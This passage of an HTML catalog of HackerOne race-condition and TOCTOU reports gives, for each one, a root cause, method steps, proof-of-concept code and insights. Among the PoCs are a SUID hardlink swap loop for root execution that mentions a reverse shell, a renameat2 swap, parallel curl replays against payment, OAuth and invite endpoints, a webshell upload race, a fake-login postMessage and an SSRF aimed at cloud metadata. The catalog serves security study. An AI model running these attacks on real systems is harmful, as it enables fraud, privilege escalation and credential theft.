+<h4>Root cause</h4><p style="margin:0">When Tomcat's default servlet is write-enabled (readonly=false) on a case-insensitive filesystem, concurrent read+upload of the same file under load bypasses the case-sensitivity check, letting an uploaded file be treated and compiled as a JSP.</p>
+<h4>Method</h4><ol><li>Confirm default servlet is write-enabled (PUT allowed) on a Windows/case-insensitive host</li><li>Concurrently PUT a JSP payload and request it under different case (e.g. shell.Jsp vs shell.jsp) under load</li><li>Win the race so the file is served through the JSP engine -&gt; code execution</li></ol>
+<div class="pre"># PUT (write-enabled default servlet) + concurrent GET, case-varied name
+PUT /shell.Jsp  (JSP webshell body)
+GET /shell.jsp  # race until compiled as JSP</div>
+<p class="insight"><b>Insight —</b> Case-insensitive filesystems + partial/write-enabled DAV are a recurring bypass for extension/case blocklists; TOCTOU races between the security check and the file handler can turn an 'inert' upload into executable content.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2905013" target="_blank" rel="noopener">hackerone.com/reports/2905013</a></span><a class="src" href="#report-2905013" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1520931" style="--sv:var(--sev-high)" data-sev="3" data-votes="9" data-bounty="4000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Recursive-delete symlink TOCTOU (remove_dir_all) -&gt; privileged deletion outside tree</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1520931</b> · ibb · 4000 · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>unprivileged write access -&gt; trick privileged remove_dir_</b></span></div>
+<h4>Root cause</h4><p style="margin:0">std::fs::remove_dir_all checked whether each entry was a symlink and, if not, recursed/deleted by path. Because the check and the subsequent open/delete both re-resolve the path, an attacker with write access to the tree can replace a subdirectory with a symlink between check and use, so the privileged deletion follows the symlink out of the intended tree.</p>
+<h4>Method</h4><ol><li>A privileged process calls remove_dir_all on a directory the attacker can write to (e.g. temp/).</li><li>The attacker repeatedly swaps a descendant subdir for a symlink pointing at a sensitive target while the walk is in progress.</li><li>On a win the recursion follows the symlink and deletes files/dirs the attacker could not otherwise remove (reliable within seconds).</li></ol>
+<div class="pre">// PoC concept: while the privileged remove_dir_all(temp/) runs,
+// race: rename(temp/sub -&gt; ...) then symlink(sensitive_target -&gt; temp/sub)
+// so the recursive delete resolves temp/sub to sensitive_target.</div>
+<p class="insight"><b>Insight —</b> 'Check if symlink, then delete by path' cannot be made safe with a pre-call check - the path is re-resolved every syscall (TOCTOU). Secure recursive filesystem ops must open a directory fd once and use the *at() family (openat/unlinkat/O_NOFOLLOW) so names are resolved relative to a pinned fd, never re-resolved. Same lesson applies to recursive copy/chown/chmod utilities.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1520931" target="_blank" rel="noopener">hackerone.com/reports/1520931</a></span><a class="src" href="#report-1520931" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1251464" style="--sv:var(--sev-high)" data-sev="3" data-votes="8" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TOCTOU race on SUID helper that validates then execs an unlocked binary (via hardlink)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1251464</b> · acronis · awarded · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>acronis</b></span><span>Surface <b>desktop</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A SUID (root) binary validates a companion executable ('console') and then execs it without locking it; a hardlink lets the attacker place the run in a writable directory and swap 'console' between the check and the exec, winning a race to run code as root.</p>
+<h4>Method</h4><ol><li>Hardlink the SUID binary and the companion into an attacker-writable directory</li><li>Repeatedly launch the SUID binary while swapping console for a malicious binary after validation but before execution</li><li>On a win, root executes the attacker binary (e.g. reverse shell via mkfifo/nc)</li></ol>
+<div class="pre">os.link('/Applications/Acronis True Image.app/Contents/MacOS/Acronis True Image','./run')
+os.link('/Applications/Acronis True Image.app/Contents/MacOS/console','./console')
+lag=0.01
+while True:
+    os.popen('./run')
+    time.sleep(lag)
+    os.unlink('./console'); os.link('./a.out','./console')   # swap in payload
+    time.sleep(1.0)
+    os.unlink('./console'); os.link('.../MacOS/console','./console')  # restore
+    lag+=0.01
+    if os.path.exists('./pass'): exit()</div>
+<p class="insight"><b>Insight —</b> Any privileged 'verify a file, then run it' flow that doesn't hold an exclusive lock/fd across check-and-use is a TOCTOU. Hardlinking into a writable working dir + a tight swap loop wins the race. Look for signature/hash checks on sibling binaries in SUID/helper tools.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1251464" target="_blank" rel="noopener">hackerone.com/reports/1251464</a></span><a class="src" href="#report-1251464" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-429026" style="--sv:var(--sev-med)" data-sev="2" data-votes="237" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Non-idempotent payout endpoint -&gt; duplicated payments</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#429026</b> · security · awarded · 237 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The 'confirm retest' action triggered a payment on a state transition without an idempotency guard, so N parallel confirmations each disbursed money.</p>
+<h4>Method</h4><ol><li>Capture the one-time 'confirm retest' request (Copy as curl in Burp).</li><li>Fire it many times in parallel from the shell so all copies hit before the state flips.</li><li>Observe multiple retest payments queued; confirmed weeks later by an actual repeated bank transfer.</li></ol>
+<div class="pre"># background-parallel replay of the same confirm request:
+curl '&lt;confirm-retest request&gt;' &amp; \
+curl '&lt;confirm-retest request&gt;' &amp; \
+curl '&lt;confirm-retest request&gt;' &amp; \
+curl '&lt;confirm-retest request&gt;' &amp; \
+curl '&lt;confirm-retest request&gt;' &amp;</div>
+<p class="insight"><b>Insight —</b> Any endpoint that moves money/credits on a one-time state change ('confirm', 'claim', 'payout', 'approve') must be idempotent. Test by firing N copies in parallel with shell '&amp;' or turbo intruder; a successful double-spend can go unnoticed for weeks by both sides.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/429026" target="_blank" rel="noopener">hackerone.com/reports/429026</a></span><a class="src" href="#report-429026" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-331940" style="--sv:var(--sev-med)" data-sev="2" data-votes="94" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Race the one-time loyalty-claim link to multiply the bonus</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#331940</b> · vend_vdp · none · 94 votes · resolved</div>
+<div class="taxo"><span>Program <b>vend_vdp</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The loyalty-claim endpoint checks 'already claimed?' and credits the bonus non-atomically (TOCTOU), so firing the same claim POST concurrently credits the bonus N times before the first write commits.</p>
+<h4>Method</h4><ol><li>Make a sale and add a first-time customer to trigger a loyalty-claim email/link</li><li>Capture the claim POST</li><li>Send it 1-50 times concurrently (Burp Turbo Intruder / single-packet)</li><li>Each parallel request that wins the race credits the bonus again</li></ol>
+<div class="pre">POST /loyalty/claim/CLAIM_ID HTTP/1.1
+Host: store.vendhq.com
+# replay concurrently x N (Turbo Intruder / single-packet attack)</div>
+<p class="insight"><b>Insight —</b> Any 'one-time' credit/redeem/claim (coupon, referral, loyalty, gift card, cashout) is a race candidate. Fire the same request in a tight parallel burst; the guard is usually a read-then-write with no DB lock. Keep N small to avoid DoS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/331940" target="_blank" rel="noopener">hackerone.com/reports/331940</a></span><a class="src" href="#report-331940" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2616045" style="--sv:var(--sev-med)" data-sev="2" data-votes="92" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Race condition to claim a limited free item multiple times</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2616045</b> · automattic · awarded · 92 votes · resolved</div>
+<div class="taxo"><span>Program <b>automattic</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A one-per-account 'free' grant is enforced only by a read-then-write check with no atomic lock, so parallel requests all pass the check before any writes the counter.</p>
+<h4>Method</h4><ol><li>Complete the free-item claim flow (free custom domain) up to the final purchase/transaction request</li><li>Capture the POST to the transaction endpoint (public-api.wordpress.com/rest/v1.1/me/transactions)</li><li>Duplicate the request 10-15x into a Burp parallel group, altering the 'meta' name each copy</li><li>Fire all requests simultaneously (single-packet / parallel) so they race the eligibility check</li><li>Observe more than one free domain provisioned</li></ol>
+<div class="pre">POST /rest/v1.1/me/transactions  (send 10-15 copies in parallel, vary the `meta` param each)</div>
+<p class="insight"><b>Insight —</b> Any 'one free X per account' limit that isn't wrapped in a DB transaction/lock is a race target; look for claim/checkout endpoints and fire them as a parallel group.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2616045" target="_blank" rel="noopener">hackerone.com/reports/2616045</a></span><a class="src" href="#report-2616045" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-3104355" style="--sv:var(--sev-med)" data-sev="2" data-votes="64" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Race condition to exceed a per-account quota/limit</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3104355</b> · dust · none · 64 votes · resolved</div>
+<div class="taxo"><span>Program <b>dust</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A hard limit (folders, workspaces, subscribers) is checked then incremented non-atomically; firing many create requests concurrently lets them all pass the check before the count updates.</p>
+<h4>Method</h4><ol><li>Reach the enforced limit so the UI blocks further creation</li><li>Optionally free one slot (delete one) to sit just under the cap</li><li>Send a burst of simultaneous create requests (Turbo Intruder / parallel group)</li><li>End state exceeds the limit</li></ol>
+<div class="pre">Send N concurrent POSTs to the create endpoint (CreateFolder / CreateWorkspace / CreateAlertReceivers)</div>
+<p class="insight"><b>Insight —</b> Every 'max N per account' guard implemented as check-then-create is a TOCTOU race; the quickest transferable test on any quota is a concurrent burst against its create endpoint.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3104355" target="_blank" rel="noopener">hackerone.com/reports/3104355</a></span><a class="src" href="#report-3104355" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-55140" style="--sv:var(--sev-med)" data-sev="2" data-votes="50" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth token endpoint race condition mints multiple tokens, defeats revocation</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#55140</b> · ibb · awarded · 50 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>api</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">OAuth /token endpoint processes concurrent grant requests without locking the single-use code/refresh_token, so a burst of parallel requests each yields a distinct valid access_token/refresh_token pair. Revoking one (or the app authorization) leaves the others live.</p>
+<h4>Method</h4><ol><li>Register an OAuth app and complete authorize to obtain a single-use authorization code (or a refresh_token).</li><li>Fire ~20 identical grant_type=authorization_code (or refresh_token) requests in parallel before the server marks the code/token consumed.</li><li>Collect the multiple distinct access_token values returned and verify each against a simple API call (GET /api/me).</li><li>Revoke the app in account settings or revoke one token, then re-test the others: on vulnerable providers the rest stay valid.</li></ol>
+<div class="pre">#!/bin/bash
+for i in $(seq 1 20); do
+  curl --data "grant_type=authorization_code&amp;code=CODE&amp;client_id=ID&amp;client_secret=SECRET&amp;redirect_uri=REDIRECT" \
+    "https://OAUTH_PROVIDER/oauth/token" &amp;
+done
+wait
+# refresh_token variant is worse: each success yields a fresh refresh_token, so pairs grow unbounded</div>
+<p class="insight"><b>Insight —</b> Any single-use token/code endpoint is a race target. Parallelize the redemption; if you get &gt;1 valid token, the consume/lock is non-atomic. The refresh_token variant is unbounded and neuters revocation entirely.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/55140" target="_blank" rel="noopener">hackerone.com/reports/55140</a></span><a class="src" href="#report-55140" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2216036" style="--sv:var(--sev-med)" data-sev="2" data-votes="50" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Race: alter repo permissions via GraphQL during repo transfer/detach -&gt; covert persistent admin</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2216036</b> · github · awarded · 50 votes · resolved</div>
+<div class="taxo"><span>Program <b>github</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">During a repository transfer (or detach) the permission-reconciliation is not atomic. Firing the updateTeamsRepository GraphQL mutation inside that window lets a departing admin re-grant themselves admin, which survives the transfer covertly.</p>
+<h4>Method</h4><ol><li>Initiate a repo transfer (REST) / or have it detached.</li><li>Concurrently send updateTeamsRepository GraphQL mutations setting your team's permission to admin during the transfer window.</li><li>After transfer completes, the admin grant persists though it should have been revoked.</li></ol>
+<div class="pre">mutation {
+  updateTeamsRepository(input:{repositoryId:"&lt;id&gt;", teamIds:["&lt;team&gt;"], permission: ADMIN}) { clientMutationId }
+}
+# fire repeatedly, concurrently with the transfer/detach REST call</div>
+<p class="insight"><b>Insight —</b> State-transition operations (ownership transfer, detach, plan downgrade) are TOCTOU-prone: hammer permission/role mutations during the transition. Two API surfaces (REST transfer + GraphQL mutation) touching the same ACL is a classic race source.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2216036" target="_blank" rel="noopener">hackerone.com/reports/2216036</a></span><a class="src" href="#report-2216036" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-801743" style="--sv:var(--sev-med)" data-sev="2" data-votes="40" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>In-app-purchase receipt-verification replay -&gt; coin/credit inflation</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#801743</b> · reddit · awarded · 40 votes · resolved</div>
+<div class="taxo"><span>Program <b>reddit</b></span><span>Surface <b>api</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The purchase-verification endpoint credits coins per request without atomically marking the transaction_id/purchase token as consumed, so replaying the same receipt in parallel credits the account multiple times for one purchase.</p>
+<h4>Method</h4><ol><li>Buy the smallest coin package in the Android app and intercept the verify_purchase call.</li><li>Replay the identical request (same transaction_id + token) many times in parallel before the receipt is marked used.</li><li>Most parallel copies succeed (9/10 in testing) -&gt; Nx the coins for a single purchase.</li></ol>
+<div class="pre">POST /api/v2/gold/android/verify_purchase?... HTTP/1.1
+Host: oauth.reddit.com
+Authorization: Bearer &lt;token&gt;
+Content-Type: application/x-www-form-urlencoded
+
+transaction_id=GPA.XXXX-XXXX-XXXX-XXXXX&amp;token=&lt;play-token&gt;&amp;package_name=com.reddit.frontpage&amp;product_id=com.reddit.coins_1&amp;correlation_id=&lt;uuid&gt;
+# fire N copies in parallel</div>
+<p class="insight"><b>Insight —</b> IAP / payment-receipt / webhook-verification endpoints must atomically consume the receipt or transaction id (unique constraint) before granting value. Racing the same receipt/token before it is marked consumed multiplies the credited goods. Test any 'verify payment', 'redeem receipt', or 'confirm order' endpoint this way.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/801743" target="_blank" rel="noopener">hackerone.com/reports/801743</a></span><a class="src" href="#report-801743" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1460373" style="--sv:var(--sev-med)" data-sev="2" data-votes="30" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Race condition mints unlimited invites (+ cancel-refund recycle)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1460373</b> · fetlife · awarded · 30 votes · resolved</div>
+<div class="taxo"><span>Program <b>fetlife</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The remaining-invites check and decrement are not atomic; multiple concurrent POSTs each pass the check before any of them decrement, so one invite credit yields many. Cancelling a sent invite also refunds the credit, allowing further recycling.</p>
+<h4>Method</h4><ol><li>Save session cookie and authenticity_token</li><li>Fire ~10 concurrent POST /users/invitation requests (each with a distinct email)</li><li>All succeed at the cost of one invite</li><li>Optionally cancel invites to refund credits and repeat</li></ol>
+<div class="pre">curl 'https://fetlife.com/users/invitation' -H 'Cookie: _fl_sessionid={sid}' --data 'authenticity_token={tok}&amp;user%5Bemail%5D=a%2B1%40x.com' &amp; curl ... (x10 in parallel)</div>
+<p class="insight"><b>Insight —</b> Any 'limited quantity' action (invites, credits, coupons, votes) is a race target: fire N parallel requests. Also probe cancel/refund flows that return the quota so it can be recycled indefinitely.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1460373" target="_blank" rel="noopener">hackerone.com/reports/1460373</a></span><a class="src" href="#report-1460373" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2039870" style="--sv:var(--sev-med)" data-sev="2" data-votes="26" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Filesystem TOCTOU: stat()-then-fopen() symlink swap via renameat2 RENAME_EXCHANGE</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2039870</b> · curl · none · 26 votes · resolved</div>
+<div class="taxo"><span>Program <b>curl</b></span><span>Surface <b>other</b></span><span>Chain <b>file overwrite of protected files (integrity/DoS) OR redirec</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Curl_fopen calls stat(path) to decide a file is a non-regular file/fallback, then fopen(path) separately. Between the two, an attacker atomically swaps a directory and a symlink at that path (renameat2 with RENAME_EXCHANGE) so fopen follows a symlink to a protected file the victim owns.</p>
+<h4>Method</h4><ol><li>Attacker in a shared/writable dir loops renameat2(RENAME_EXCHANGE) swapping a symlink 'a'-&gt;flag with a directory 'b'.</li><li>Victim (e.g. root) runs curl writing to that path: curl --cookie-jar a URL.</li><li>If the swap lands so stat() sees a directory but fopen() opens the symlink, curl overwrites the protected target or writes sensitive cookies into an attacker-controlled file.</li></ol>
+<div class="pre">// atomically swap two names in a tight loop to win the race:
+#define _GNU_SOURCE
+#include &lt;fcntl.h&gt;
+#include &lt;linux/fs.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/syscall.h&gt;
+int main(int argc, char *argv[]) {
+  while (1)
+    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
+}
+// victim: curl --cookie-jar a google.com   (also affects HSTS / alt-svc file writes)</div>
+<p class="insight"><b>Insight —</b> The archetypal filesystem TOCTOU: any check(path) followed by a separate open(path) is race-able because the kernel re-resolves the path each syscall. RENAME_EXCHANGE gives an attacker an atomic, reliable symlink&lt;-&gt;dir flip so the check and the open see different objects. Grep native code for lstat/stat/access followed by open/fopen on the same path; the fix is O_NOFOLLOW / openat on a pinned fd.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2039870" target="_blank" rel="noopener">hackerone.com/reports/2039870</a></span><a class="src" href="#report-2039870" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1293377" style="--sv:var(--sev-med)" data-sev="2" data-votes="16" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Race check-then-send email endpoint to flood a victim</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1293377</b> · khanacademy · none · 16 votes · resolved</div>
+<div class="taxo"><span>Program <b>khanacademy</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">requestAuthEmail checks 'is this email already linked?' then sends a confirmation email as separate non-atomic steps; concurrent requests all pass the check and each send an email to an arbitrary target address.</p>
+<h4>Method</h4><ol><li>Start the 'connect another email' flow and intercept the requestAuthEmail GraphQL POST</li><li>Downgrade to HTTP/1.1, tag with 'X-Request: %s' and send to Turbo Intruder</li><li>Fire ~30 gated concurrent requests; the target address receives ~30 signup emails</li></ol>
+<div class="pre">engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100, pipeline=False)
+for i in range(30):
+    engine.queue(target.req, target.baseInput, gate='race1')
+engine.openGate('race1')</div>
+<p class="insight"><b>Insight —</b> Even when a normal duplicate request is rejected ('email already added'), racing the endpoint bypasses the guard and turns any user-triggered email send into an email-bombing / spam-relay primitive against arbitrary recipients.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1293377" target="_blank" rel="noopener">hackerone.com/reports/1293377</a></span><a class="src" href="#report-1293377" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-859962" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Double DNS-resolution TOCTOU -&gt; SSRF filter (allowlist) bypass via 0-TTL DNS</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#859962</b> · kubernetes · awarded · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>kubernetes</b></span><span>Surface <b>other</b></span><span>Chain <b>DNS TOCTOU -&gt; apiserver proxy SSRF -&gt; cloud metadata /</b></span><span>Tag <b>cloud-aws</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The apiserver proxy resolved a node's hostname once to validate it against a filter and again to actually make the proxied request. An attacker-controlled authoritative DNS server returning different answers per query (TTL 0) returns a safe IP for the validation resolve and a forbidden IP (169.254.169.254 / localhost) for the request resolve.</p>
+<h4>Method</h4><ol><li>Stand up an authoritative DNS server for a delegated zone that returns a different A record on each consecutive query (TTL 0).</li><li>Register a Node whose address is a hostname in that zone.</li><li>Send a request through the apiserver proxy (kubectl proxy; curl localhost:8001/api/v1/nodes/&lt;name&gt;:80/proxy/).</li><li>First resolve passes the filter; second resolve points at cloud metadata or a localhost service -&gt; SSRF.</li></ol>
+<div class="pre"># authoritative DNS returns alternating answers with TTL 0:
+#   query 1 -&gt; 203.0.113.10   (passes apiserver filter)
+#   query 2 -&gt; 169.254.169.254 (used for the actual proxied fetch)
+curl localhost:8001/api/v1/nodes/toctou:80/proxy/</div>
+<p class="insight"><b>Insight —</b> Whenever code resolves a hostname for a security check and then re-resolves it for the actual fetch, a 0-TTL rotating DNS record (DNS-rebinding-style TOCTOU) defeats the allowlist/SSRF filter. The fix is resolve-once-and-pin: validate and connect using the SAME resolved IP. Probe any URL/host allowlist that accepts hostnames with attacker-controlled DNS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/859962" target="_blank" rel="noopener">hackerone.com/reports/859962</a></span><a class="src" href="#report-859962" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-852091" style="--sv:var(--sev-med)" data-sev="2" data-votes="22" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TOCTOU driver swap: replace signed driver between integrity check and install</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#852091</b> · valve · awarded · 22 votes · resolved</div>
+<div class="taxo"><span>Program <b>valve</b></span><span>Surface <b>desktop</b></span><span>Chain <b>TOCTOU file swap -&gt; malicious kernel driver install -&gt;</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Steam verifies file integrity at startup and re-downloads tampered files, but the SteamStreaming .sys drivers are installed on first Remote Play use; there is a window after the integrity check and before install where a non-admin user can overwrite the driver file, so the modified (unsigned/malicious) driver is installed with kernel privileges.</p>
+<h4>Method</h4><ol><li>Start Steam and let it verify/restore files</li><li>Trigger driver install path (first Remote Play stream) but overwrite C:\Program Files (x86)\Steam\drivers\Windows10\x64\SteamStreamingMicrophone.sys after the check, before install</li><li>Steam installs the attacker's driver -&gt; arbitrary kernel-mode code</li></ol>
+<p class="insight"><b>Insight —</b> Any privileged installer/updater that (1) validates a file then (2) later consumes it from a user-writable path is a TOCTOU target. Look for the validate-&gt;use gap and win the race by replacing the file in the window (or with an oplock/symlink).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/852091" target="_blank" rel="noopener">hackerone.com/reports/852091</a></span><a class="src" href="#report-852091" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-381356" style="--sv:var(--sev-low)" data-sev="1" data-votes="153" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Race a forged postMessage (no origin check) to hijack followUpUrl</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#381356</b> · security · awarded · 153 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A Marketo form listener on the parent origin accepted postMessages without verifying event.origin; if the message signalled success and the form lacked onSuccess, the parent navigated to an attacker-supplied followUpUrl.</p>
+<h4>Method</h4><ol><li>Open victim page (form auto-opens via #contact) in a new window</li><li>Spam forged success postMessages carrying followUpUrl every ~10ms to win the race vs the real Marketo response</li><li>Pick a form with no onSuccess (mktoForm_1013); parent sets location.href = followUpUrl</li><li>On Safari use a data: URL to render a fake login and harvest creds</li></ol>
+<div class="pre">b.postMessage('{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"data:text/html;base64,&lt;fake login&gt;"}}}','*')</div>
+<p class="insight"><b>Insight —</b> Any window.addEventListener('message') without an origin allowlist is attackable; if the handler drives navigation/DOM from message data, race your forged message ahead of the legitimate cross-frame reply. Client-side races don't need Turbo Intruder -- just spam before the real event.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/381356" target="_blank" rel="noopener">hackerone.com/reports/381356</a></span><a class="src" href="#report-381356" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-604534" style="--sv:var(--sev-low)" data-sev="1" data-votes="151" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Duplicate membership rows via parallel join -&gt; irremovable member / broken state</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#604534</b> · security · awarded · 151 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The group-join handler checks 'is user already a member?' then inserts a membership row with no unique constraint, so parallel joins each pass the check and create duplicate rows. Deletion logic then cannot fully remove the user, leaving persistent/broken state.</p>
+<h4>Method</h4><ol><li>As a normal user, obtain a valid group invite link.</li><li>Send the POST /group/post_join request many times in parallel (5 parallel requests sufficed).</li><li>You are added 2+ times; the group leader can no longer remove you and neither can you remove yourself.</li></ol>
+<div class="pre">POST /group/post_join HTTP/1.1
+Host: ctf.hacker101.com
+Content-Type: application/x-www-form-urlencoded
+Cookie: &lt;session&gt;
+
+csrf=&lt;csrf&gt;&amp;invite=&lt;invite-token&gt;
+# fire ~5-30 copies in parallel (turbo intruder gate)</div>
+<p class="insight"><b>Insight —</b> Race conditions do not only inflate counters - duplicate rows from a missing unique constraint can produce IRREMOVABLE or otherwise corrupt state (persistence, self-DoS on the resource). When auditing join/link/relationship tables, check for a DB unique constraint, not just an app-level 'already exists?' check.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/604534" target="_blank" rel="noopener">hackerone.com/reports/604534</a></span><a class="src" href="#report-604534" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-146845" style="--sv:var(--sev-low)" data-sev="1" data-votes="124" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
